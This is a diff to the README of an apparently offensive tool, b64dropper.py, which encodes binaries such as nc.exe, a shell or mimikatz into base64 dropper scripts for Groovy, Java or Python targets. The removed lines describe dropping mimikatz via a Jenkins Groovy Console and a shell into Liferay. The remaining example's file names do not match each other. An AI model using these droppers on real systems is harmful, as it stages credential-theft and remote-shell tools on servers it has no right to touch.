@@ -46,45 +46,15 @@ options:
 ```
 
 
-## EXAMPLES
+## EXAMPLE
 
 Generate a dropper for a small tool (e.g., `nc.exe`) to be executed via a Python interpreter on the target:
 
 ```bash
-python3 b64dropper.py nc.exe -l python -f nc.exe -o deploy_nc.py
+python3 b64dropper.py nc.exe -l groovy -f nc.exe -o nc_dropper_script.groovy
+# copy to your clipboard
+cat deploy_nc.groovy | xclip -selection clipboard -i
 ```
 
-
-
-**Scenario**: Deploying a refined generic shell to a Liferay instance via Java.
-
-```bash
-
-python3 b64dropper.py shell.elf -l java -f /tmp/shell -o Dropper.java
-```
-
-**Scenario**: Dropping a static `mimikatz` binary to a Jenkins Groovy Console.
-
-```bash
-# generate a mimikatz dropper Groovy script
-python3 b64dropper.py path/to/mimikatz -l groovy -f /tmp/mimikatz -o build_mimikatz.groovy -s 4000
-```
-
-_The `-s 4000` flag ensures chunks fit comfortably within Groovy's string handling limits._
-
-### Output: `build_mimikatz.groovy`
-
-```groovy
-// Decodes base64 chunks and writes to file
-def chunks = [
-    "TVqQAAMAAAAEAAAA//8AALgAAA...",
-    "AAAAAAAAAAAAAAAAAAAAAAAAAAAA..."
-]
-
-File file = new File("/tmp/mimikatz")
-file.withOutputStream { out ->
-    chunks.each { chunk ->
-        out.write(Base64.decoder.decode(chunk))
-    }
-```
+---
 
